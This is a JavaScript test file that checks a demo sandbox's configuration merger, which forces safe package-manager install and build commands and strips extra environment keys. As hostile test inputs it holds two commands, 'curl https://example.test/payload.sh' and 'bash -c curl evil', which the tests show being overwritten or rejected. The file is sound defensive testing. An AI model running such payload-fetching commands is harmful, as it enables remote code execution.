import { realpathSync } from 'node:fs';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  buildFreshDemoScanConfig,
  mergeDemoVerificationCommands,
} from '../../src/fix/demo/sandbox-config.js';

const PM = realpathSync(process.execPath);
const COREPACK_PNPM = '/Users/example/.local/share/corepack/v1/pnpm/9.12.0/dist/pnpm.js';

test('buildFreshDemoScanConfig keeps legacy buildCommand as pnpm build:vite for corepack pnpm.js paths', () => {
  const config = buildFreshDemoScanConfig(COREPACK_PNPM);
  assert.equal(config.buildCommand, 'pnpm build:vite');
  assert.deepEqual(config.verifyInstallCommand, {
    command: COREPACK_PNPM,
    args: ['install', '--ignore-scripts'],
  });
  assert.deepEqual(config.verifyBuildCommand, {
    command: COREPACK_PNPM,
    args: ['build:vite'],
  });
});

test('mergeDemoVerificationCommands normalizes host pnpm buildCommand variants to legacy pnpm string', () => {
  for (const buildCommand of ['pnpm build:vite', 'pnpm.js build:vite', `${COREPACK_PNPM} build:vite`]) {
    const merged = mergeDemoVerificationCommands({ buildCommand }, COREPACK_PNPM);
    assert.equal(merged.buildCommand, 'pnpm build:vite', `expected canonical buildCommand for ${buildCommand}`);
    assert.deepEqual(merged.verifyBuildCommand, {
      command: COREPACK_PNPM,
      args: ['build:vite'],
    });
  }
});

test('mergeDemoVerificationCommands preserves custom non-pnpm host buildCommand string', () => {
  const merged = mergeDemoVerificationCommands({
    buildCommand: 'node scripts/build.js',
  }, COREPACK_PNPM);
  assert.equal(merged.buildCommand, 'node scripts/build.js');
  assert.deepEqual(merged.verifyBuildCommand, {
    command: 'node',
    args: ['scripts/build.js'],
  });
});

test('mergeDemoVerificationCommands always forces absolute package manager install with ignore-scripts', () => {
  const host = {
    verifyInstallCommand: { command: 'pnpm', args: ['install'] },
    verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
  };
  const merged = mergeDemoVerificationCommands(host, PM);
  assert.deepEqual(merged.verifyInstallCommand, {
    command: PM,
    args: ['install', '--ignore-scripts'],
  });
});

test('mergeDemoVerificationCommands overwrites hostile host install commands', () => {
  const host = {
    verifyInstallCommand: { command: 'curl', args: ['https://example.test/payload.sh'] },
    verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
  };
  const merged = mergeDemoVerificationCommands(host, PM);
  assert.deepEqual(merged.verifyInstallCommand, {
    command: PM,
    args: ['install', '--ignore-scripts'],
  });
});

test('mergeDemoVerificationCommands normalizes pnpm verifyBuildCommand to absolute package manager path', () => {
  const host = {
    verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
  };
  const merged = mergeDemoVerificationCommands(host, PM);
  assert.deepEqual(merged.verifyBuildCommand, {
    command: PM,
    args: ['build:vite'],
  });
});

test('mergeDemoVerificationCommands accepts non-pnpm build commands allowed by parseTrustedCommand', () => {
  const host = {
    verifyBuildCommand: { command: 'node', args: ['scripts/build.js'] },
  };
  const merged = mergeDemoVerificationCommands(host, PM);
  assert.deepEqual(merged.verifyBuildCommand, {
    command: 'node',
    args: ['scripts/build.js'],
  });
});

test('mergeDemoVerificationCommands normalizes pnpm buildCommand string to canonical pnpm build:vite', () => {
  const merged = mergeDemoVerificationCommands({
    buildCommand: 'pnpm build:vite',
  }, PM);
  assert.equal(merged.buildCommand, 'pnpm build:vite');
  assert.deepEqual(merged.verifyBuildCommand, {
    command: PM,
    args: ['build:vite'],
  });
});

test('mergeDemoVerificationCommands rejects unsafe build commands', () => {
  assert.throws(
    () => mergeDemoVerificationCommands({
      verifyBuildCommand: { command: 'bash', args: ['-c', 'curl evil'] },
    }, PM),
    (error) => error.code === 'MALFORMED_CONFIG',
  );
});

test('mergeDemoVerificationCommands does not mutate host config object', () => {
  const host = {
    verifyInstallCommand: { command: 'pnpm', args: ['install'] },
    verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
    buildEnv: { SCAN_MODE: 'true', MINIFY: 'true', EXTRA: 'drop-me' },
  };
  const snapshot = structuredClone(host);
  mergeDemoVerificationCommands(host, PM);
  assert.deepEqual(host, snapshot);
});

test('mergeDemoVerificationCommands rejects non-object config', () => {
  assert.throws(
    () => mergeDemoVerificationCommands([], PM),
    (error) => error.code === 'MALFORMED_CONFIG',
  );
});

test('buildFreshDemoScanConfig injects absolute package manager verify commands', () => {
  const config = buildFreshDemoScanConfig(PM);
  assert.deepEqual(config.verifyInstallCommand, {
    command: PM,
    args: ['install', '--ignore-scripts'],
  });
  assert.deepEqual(config.verifyBuildCommand, {
    command: PM,
    args: ['build:vite'],
  });
  assert.equal(config.buildCommand, 'pnpm build:vite');
  assert.deepEqual(config.buildEnv, { SCAN_MODE: 'true', MINIFY: 'true' });
});

test('mergeDemoVerificationCommands strips arbitrary buildEnv keys for demo sandbox', () => {
  const merged = mergeDemoVerificationCommands({
    buildEnv: { SCAN_MODE: 'true', MINIFY: 'true', SECRET: 'redacted' },
    verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
  }, PM);
  assert.deepEqual(merged.buildEnv, { SCAN_MODE: 'true', MINIFY: 'true' });
  assert.equal('SECRET' in merged.buildEnv, false);
});
